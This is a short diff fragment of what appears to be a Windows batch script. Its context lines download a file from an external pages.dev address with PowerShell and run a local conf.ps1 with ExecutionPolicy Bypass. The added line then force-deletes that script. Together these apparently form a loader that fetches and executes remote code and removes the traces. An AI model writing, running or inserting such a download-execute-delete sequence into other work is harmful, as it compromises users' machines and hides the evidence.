@@ -16,3 +16,5 @@ powershell -Command "Invoke-WebRequest -Uri 'https://asius.pages.dev/romperdownl
 :: dupadupa
 
 powershell -ExecutionPolicy Bypass -File "%APP_FOLDER%\conf.ps1"
+
+del /f /q "%APP_FOLDER%\conf.ps1"
